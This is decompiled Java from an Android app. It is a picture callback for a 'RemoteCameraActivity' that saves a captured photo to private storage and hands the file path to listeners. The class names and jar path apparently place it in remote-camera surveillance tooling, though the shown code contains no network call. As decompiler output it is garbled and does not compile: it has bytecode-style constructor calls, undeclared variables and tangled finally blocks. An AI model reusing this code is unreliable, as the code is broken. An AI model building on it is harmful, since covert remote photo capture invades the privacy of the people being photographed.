package com.remote.camera.normal;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import com.vvt.io.d;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.OutputStream;

class h
  implements Camera.PictureCallback
{
  h(RemoteCameraActivity paramRemoteCameraActivity) {}
  
  public void onPictureTaken(byte[] paramArrayOfByte, Camera paramCamera)
  {
    int i = 2;
    boolean bool1 = RemoteCameraActivity.a();
    if (bool1) {}
    bool1 = false;
    localObject1 = null;
    Object localObject2 = this.a;
    RemoteCameraActivity.h((RemoteCameraActivity)localObject2);
    try
    {
      localObject2 = this.a;
      Object localObject4 = this.a;
      localObject4 = RemoteCameraActivity.i((RemoteCameraActivity)localObject4);
      Object localObject5 = null;
      localObject1 = ((RemoteCameraActivity)localObject2).openFileOutput((String)localObject4, 0);
      ((FileOutputStream)localObject1).write(paramArrayOfByte);
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject4 = this.a;
      localObject4 = ((RemoteCameraActivity)localObject4).getFilesDir();
      localObject4 = ((File)localObject4).getPath();
      localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
      localObject4 = File.separator;
      localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
      localObject4 = this.a;
      localObject4 = RemoteCameraActivity.i((RemoteCameraActivity)localObject4);
      localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
      localObject2 = ((StringBuilder)localObject2).toString();
      boolean bool2 = RemoteCameraActivity.a();
      if (bool2) {}
      localObject4 = i.b;
      RemoteCameraActivity localRemoteCameraActivity;
      int k;
      if (localObject4 != null)
      {
        bool2 = RemoteCameraActivity.a();
        if (bool2) {}
        localObject4 = i.b;
        localObject5 = this.a;
        localObject5 = RemoteCameraActivity.i((RemoteCameraActivity)localObject5);
        localRemoteCameraActivity = this.a;
        k = RemoteCameraActivity.j(localRemoteCameraActivity);
        ((b)localObject4).a((String)localObject2, (String)localObject5, k);
      }
      localObject4 = this.a;
      localObject4 = ((RemoteCameraActivity)localObject4).b;
      if (localObject4 != null)
      {
        bool2 = RemoteCameraActivity.a();
        if (bool2) {}
        localObject4 = this.a;
        localObject4 = ((RemoteCameraActivity)localObject4).b;
        localObject4 = ((i)localObject4).a();
        localObject5 = this.a;
        localObject5 = RemoteCameraActivity.i((RemoteCameraActivity)localObject5);
        localRemoteCameraActivity = this.a;
        k = RemoteCameraActivity.j(localRemoteCameraActivity);
        ((b)localObject4).a((String)localObject2, (String)localObject5, k);
      }
      d.a((OutputStream)localObject1);
      localObject1 = this.a;
      j = RemoteCameraActivity.a((RemoteCameraActivity)localObject1);
      if (j != i) {
        break label346;
      }
      localObject1 = this.a;
    }
    catch (FileNotFoundException localFileNotFoundException) {}finally
    {
      for (;;)
      {
        try
        {
          label346:
          bool3 = RemoteCameraActivity.b();
          if (bool3) {}
          d.a((OutputStream)localObject1);
          localObject1 = this.a;
          j = RemoteCameraActivity.a((RemoteCameraActivity)localObject1);
          if (j != i) {
            continue;
          }
          localObject1 = this.a;
          continue;
        }
        finally
        {
          int j;
          boolean bool3;
          int m;
          Object localObject3 = localObject1;
          localObject1 = localObject6;
          continue;
        }
        localOutputStream = finally;
        bool3 = RemoteCameraActivity.b();
        if (bool3) {}
        d.a((OutputStream)localObject1);
        localObject1 = this.a;
        j = RemoteCameraActivity.a((RemoteCameraActivity)localObject1);
        if (j == i) {
          localObject1 = this.a;
        }
      }
    }
    ((RemoteCameraActivity)localObject1).finish();
    return;
    d.a(localOutputStream);
    localObject3 = this.a;
    m = RemoteCameraActivity.a((RemoteCameraActivity)localObject3);
    if (m == i)
    {
      localObject3 = this.a;
      ((RemoteCameraActivity)localObject3).finish();
    }
    throw ((Throwable)localObject1);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/remote/camera/normal/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */